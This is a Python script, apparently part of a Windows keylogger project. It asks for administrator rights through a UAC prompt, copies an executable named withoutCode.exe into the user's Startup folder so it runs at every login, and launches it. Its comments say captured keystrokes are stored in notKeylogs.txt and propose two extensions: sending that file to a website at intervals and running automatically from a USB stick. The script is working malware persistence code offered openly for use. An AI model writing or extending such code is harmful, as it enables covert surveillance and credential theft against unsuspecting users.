import os
import shutil
import ctypes, sys
import time

#   check for admin privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

#Windows PC name
accountName = os.getlogin()

#From where the script runs
sourceFileDirectory = os.path.abspath(os.getcwd()) + "\\dist\\withoutCode.exe"
#   if you use pyinstaller for compiling the executable, the output will be in the above mentioned dist folder, if you use nuitka or something else, be sure to change the path

#Where the scripts gets copied
destinationFileDirectory = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\withoutCode.exe".format(accountName)

if is_admin():
    shutil.copyfile(sourceFileDirectory, destinationFileDirectory)
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)

time.sleep(5)
#   runs the file in the directory stored in the "destinationFileDirectory" variable
os.startfile(destinationFileDirectory)

#   the code is currently unfinished, it can be upgraded by connecting to a website and with the REST commands send every once in a while the notKeylogs.txt file (in which the keystrokes are saved)
#   additionally there's the possibility of adding it to a usb stick and make it execute these commands upon insertion